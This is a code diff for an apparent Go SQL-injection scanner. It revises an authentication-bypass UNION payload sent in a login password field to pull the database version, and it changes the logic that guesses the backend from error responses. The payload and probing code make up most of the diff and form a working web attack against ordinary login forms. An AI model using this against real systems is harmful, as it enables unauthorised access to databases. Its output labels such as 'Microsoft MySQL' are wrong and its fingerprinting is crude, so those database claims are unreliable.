@@ -6,6 +6,7 @@ import (
 		"log"
 		"net/http"
 		"net/url"
+		"strings"
 )
 
 type Database struct {
@@ -62,14 +63,14 @@ func check_sqli() bool {
 func get_version() string {
 	data := url.Values {
 		"username":		{"admin"},
-		"password":		{"test'OR'1'='1 UNION SELECT 1,2,@@version;-- "},
+		"password":		{"test'OR'1'='1' UNION SELECT 1,2,@@version;-- "},
 	};
 	code, body := get_response(data);
-	if (code == 200) {
+	if (code == 500 || (strings.Contains(body, "Fatal"))) {
 		fmt.Println(body);
-		return "Microsoft"
+		return "Oracle";
 	}
-	return "Oracle";
+	return "Microsoft";
 }
 
 func main() {
@@ -78,6 +79,12 @@ func main() {
 	if (vuln == true) {
 		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********");
 		var _type string = get_version();
-		fmt.Println(_type);
+		if (_type == "Microsoft") {
+			fmt.Println("************MICROSOFT MYSQL DATABASE IN USE**************");
+		} else if (_type == "Oracle") {
+			fmt.Println("************ORACLE SQL DATABASE IN USE***************");
+		} else {
+			fmt.Println("************UNABLE TO DETERMINE DATABASE TYPE**************");
+		}
 	}
 }
